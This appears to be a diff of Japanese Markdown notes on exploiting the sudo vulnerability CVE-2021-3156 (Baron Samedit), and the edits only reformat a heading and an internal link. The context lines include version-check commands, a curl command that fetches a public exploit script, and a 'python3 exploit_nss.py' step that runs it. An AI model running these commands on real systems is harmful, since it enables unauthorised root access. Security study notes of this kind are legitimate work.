@@ -752,7 +752,7 @@ dpkg -l sudo
 # RHEL / CentOS / Fedora の場合
 rpm -qa | grep sudo
 ```
-- → 出力を **vulnerable / fixed バージョン表** と照合
+- → 出力を[[#ディストロごとのvulnerable / fixed バージョン]]と照合
 
 3. exploit の実行
 ```sh
@@ -761,7 +761,7 @@ curl -fsSL https://raw.githubusercontent.com/worawit/CVE-2021-3156/main/exploit_
 python3 exploit_nss.py
 ```
 
-#### ディストロごとの vulnerable / fixed バージョン
+#### ディストロごとのvulnerable / fixed バージョン
 
 🔗参照：  
 https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow.txt
